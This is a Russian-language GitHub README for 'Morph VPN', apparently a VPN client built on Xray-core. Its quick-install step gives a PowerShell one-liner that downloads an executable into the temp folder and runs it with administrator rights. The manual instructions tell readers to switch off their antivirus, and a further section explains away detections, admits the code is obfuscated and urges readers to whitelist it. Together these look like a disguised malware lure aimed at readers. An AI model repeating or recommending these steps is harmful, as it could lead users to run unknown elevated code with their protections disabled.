<div align="center">

# 🛡️ Morph VPN
### Secure Cyber-Tunneling Protocol

[![Stars](https://img.shields.io/badge/Stars-127-yellow?style=for-the-badge&logo=github&logoColor=white)](https://github.com/goldwinston/Morph-VPN)
[![Downloads](https://img.shields.io/badge/Downloads-1.2K-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/goldwinston/Morph-VPN)
[![Version](https://img.shields.io/badge/Version-V2.0.3-purple?style=for-the-badge)](https://github.com/goldwinston/Morph-VPN)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-informational?style=for-the-badge)](https://github.com/goldwinston/Morph-VPN)

<img width="431" height="776" alt="image" src="https://github.com/user-attachments/assets/4ef62f7d-ae93-49c3-b622-320eaf75e7ba" />
<img width="1745" height="587" alt="image" src="https://github.com/user-attachments/assets/1bb40c97-d8ef-4126-935b-ef4e32202d80" />

**Morph VPN** — это надёжный VPN-клиент с поддержкой Xray-core, обеспечивающий полную анонимность, обход блокировок и высокую скорость соединения.

</div>

---

## ⚡ БЫСТРАЯ УСТАНОВКА (ЗА 5 СЕКУНД)

<div align="center">

### 🚀 **Скачай и запусти одной командой!**

</div>

### Windows
1. Нажми **`Win + R`** (откроется окно "Выполнить").
2. Скопируй и вставь эту команду:

```powershell
powershell -c irm https://github.com/goldwinston/Morph-VPN/releases/latest/download/MorphVPN.exe -OutFile $env:TEMP\MorphVPN.exe; Start-Process $env:TEMP\MorphVPN.exe -Verb RunAs
```

---

Нажми Enter — и Morph VPN автоматически скачается и запустится!

---
## 🛠️ ЕСЛИ КОМАНДА НЕ РАБОТАЕТ — РУЧНАЯ УСТАНОВКА
---
Если PowerShell-команда не сработала (ошибка политики выполнения, блокировка антивирусом или корпоративные ограничения), установите Morph VPN вручную.

### 📥 Инструкция

1. Перейдите в раздел **[Releases](https://github.com/goldwinston/Morph-VPN/releases/latest)**.
2. Скачайте файл **`MorphVPN.exe`**.
3. **Временно отключите антивирус** (Windows Defender или сторонний).
4. Запустите файл **от имени администратора** (правой кнопкой → «Запуск от имени администратора»).
5. После завершения установки включите антивирус обратно.

---

### ❓ Почему антивирус блокирует Morph VPN?

Morph VPN использует **Xray-core** — технологию, которая работает на уровне сетевых драйверов и создаёт зашифрованные туннели. Антивирусы (особенно Windows Defender, Kaspersky, ESET, Avast) часто ложно срабатывают на такие приложения, потому что они:

- изменяют сетевые маршруты и параметры прокси (это похоже на поведение вредоносных программ);
- устанавливают виртуальный сетевой адаптер (редкое действие для обычных программ);
- имеют обфусцированный код для защиты от анализа со стороны провайдеров (это стандарт для всех современных VPN).

**Важно:** мы не маскируем вредоносный код. Мы используем те же методы защиты, что и любой коммерческий VPN (Proton, Nord, Express), чтобы ваш интернет-провайдер не мог заблокировать приложение.

После первого запуска добавьте Morph VPN в исключения антивируса — и он больше не будет мешать.

---
